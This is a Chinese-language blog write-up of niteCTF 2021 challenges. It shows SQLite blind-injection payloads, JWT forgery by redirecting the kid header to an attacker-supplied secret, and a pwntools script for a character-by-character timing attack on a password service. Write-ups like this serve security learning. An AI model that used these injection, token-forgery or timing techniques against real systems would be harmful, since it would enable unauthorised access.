---
title: "niteCTF2021 Wp"
slug: "nitectf2021-wp"
description: "如果你看到这行字，说明其中有一个脚本还没有完善好，咕咕"
date: 2021-12-12T23:12:52+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

http://ctf.cryptonite.team/challenges

https://ctftime.org/event/1449

## Web/welcome to niteCTF

> **welcome** **baby**
>
> Go to the [https://capturetheflag.cryptonite.team](https://capturetheflag.cryptonite.team/) and copy the flag, it's that simple!

![image-20211212205533558](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205533558.png)

f12给整了个b64，解码之后是Cryptonite，很遗憾它并不是flag

抓包后看到有jsfuck

![image-20211212205758869](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205758869.png)

'Organized by Cryptonite Manipal'

也不是flag，就很鸡贼，在另一个js文件中

![image-20211212210259142](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212210259142.png)

![image-20211212210245571](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212210245571.png)

## Web/BATCHEST

> My friend just opened a new zoo, so I made him a site to check if his zoo has those animals. https://blindsqli-web.chall.cryptonite.team/
>
> Author: SPEED

把盲注的提示写到url中了

![image-20211212213444605](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212213444605.png)

它的回显只有有和没有两种，所以需要char-by-char类型的盲注

不过这里要注意`lion'or '1' #`返回了500，而`lion'or '1' -- `返回正常，说明这里的数据库是sqlite，用的是`sqlite_master`来获取信息

```
# 脚本我之后完善一下
# 之前写了一个通用的char-by-char-sqli的模板
# 但是发现耦合性太高了
# 还是按功能分开函数写比较好
# 待完善中XD
# 然后看到了一个截图
# 对哦 他妈的为什么盲注这种东西不直接用burp-intruder呢？？？？？？？
# ？？？？
# 突然发现了一个华点
# 还写个p的脚本 用burp
# 开玩笑的 各有各的应用场景
```

## Web/JWT

> Jason likes cookies but he is diabetic. So his mom stored them away somewhere safe. Can you help him find the path that leads to the solution for his hungry desires?
>
> [https://jwt-web.challenge.cryptonite.team](https://jwt-web.challenge.cryptonite.team/) http://35.201.116.81/
>
> Author: LatinArceus

![image-20211212011510158](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011510158.png)

![image-20211212011548007](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011548007.png)

我们得伪造一个`"admin_cap":"true"`的cookie，注意到这里的`kid`指向的是服务器本地的secret.txt，那我们只需要把它指向我们自己的secret.txt就好了

![image-20211212205136265](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205136265.png)

![image-20211212205200492](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212205200492.png)

`nite{R3diR3ct10n_c4n_b3_4_vuLn_t0O}`

## Misc/Let's be Artistic

> We have received some encoded message from an art gallery. Can you trace it back to the flag? The flag is all uppercase. Wrap it in flag format nite{}

```
87yhnmkj 5rfvbnju76 5rfvbnju76 tyjnbg tyjnbg 5rfc6ygn cft6yhn efvgyjmko 9ikm xdr5thnji9 87yhnmkj
```

键盘打字的轨迹 ~~（在键盘上撒把米 鸡跑的路线~~

`nite{GOODDRAWING}`

## Misc/Slow Passwords

> We made ourselves super secure by a random password authentication every time the connection is established. Is it really that secure?
>
> `nc slow-passwords.challenge.cryptonite.team 1337`

刚开始都没明白啥意思，看了wp知道了

每次连接服务器生成不同的passwd，允许每次1个字符输3次，但是输入不同字符的响应时间是不同的，有的长有的短，我们可以找个参照字符（比如`'a'`），通过响应时间跟`'a'`所花的时间的偏移量来判断是否正确（相当于一种变相的时间盲注了），从而计算出下一个该输入的字符

```python
from pwn import *
from time import time

p = remote("slow-passwords.challenge.cryptonite.team", 1337)
print(p.recvlines(5))
curr = p.recvline()
print('start:', curr)
count = 0
while count < 11:
    curr = 'a'
    p.sendline(b'a')
    print(p.recvline())
    start = time()
    print(p.recvline())
    end = time()
    offset = round(end - start)
    print("offset:", offset)
    next = bytes(chr(ord('a') + offset), 'utf-8')
    p.sendline(next)
    print(p.recvline())
    print(p.recvline())
    count += 1

p.close()

```

![image-20211212213101123](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212213101123.png)

很巧妙的用法！这个故事告诉我们char-by-char类型的盲注真的是在以各种各样的形式四处开花，在很多场合都能用的上

参考：[wp](https://github.com/jontay999/CTF-writeups/tree/master/niteCTF/Misc/slow_passwords)

------

最近刷题到buuoj第7页了，学校也到第15周的教学周了，这周还有四级，整个人，有点难顶的

所以！我选择当一只鸵鸟，本着：车到山前必有路，船到桥头自然直的态度迎来寒假前这段时间！

太多的flag就不立了，立心里了
